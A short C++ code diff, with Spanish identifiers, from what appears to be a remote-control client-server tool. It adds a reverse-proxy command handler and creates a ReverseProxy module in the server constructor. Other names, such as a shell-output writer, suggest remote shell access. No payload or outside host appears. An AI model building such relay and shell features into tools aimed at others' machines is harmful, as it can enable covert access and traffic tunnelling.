@@ -534,6 +534,13 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
         return;
     }
 
+    //mod reverse proxy
+    if (iComando == EnumComandos::PROXY_CMD) {
+        DEBUG_MSG("Procesando respuesta de proxy...");
+        p_Servidor->modRerverseProxy->procRespuestaProxy(iRecibido-1, paquete.cBuffer);
+        return;
+    }
+
 }
 
 void Cliente_Handler::EscribirSalidaShell(const char*& cBuffer) {
@@ -685,6 +692,8 @@ Servidor::Servidor(){
     this->m_txtLog = DBG_NEW MyLogClass();
 
     this->Init_Key();
+
+    this->modRerverseProxy = new ReverseProxy();
 
 }
 
